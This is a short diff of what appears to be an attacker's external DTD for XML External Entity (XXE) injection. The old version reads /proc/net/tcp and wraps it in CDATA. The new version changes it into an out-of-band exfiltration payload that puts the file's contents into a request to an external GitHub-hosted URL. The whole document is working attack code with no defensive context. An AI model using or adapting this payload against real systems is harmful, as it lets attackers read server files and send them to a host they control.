@@ -1,4 +1,3 @@
-<!ENTITY % file SYSTEM "file:/proc/net/tcp">
-<!ENTITY % start "<![CDATA[">
-<!ENTITY % end "]]>">
-<!ENTITY % all "<!ENTITY fileContents '%start;%file;%end;'>">
+<!ENTITY % file SYSTEM "file:///proc/net/tcp">
+<!ENTITY % all "<!ENTITY send SYSTEM 'https://raw.githubusercontent.com/mdeniaud35/test/main/?%file;'>">
+%all;
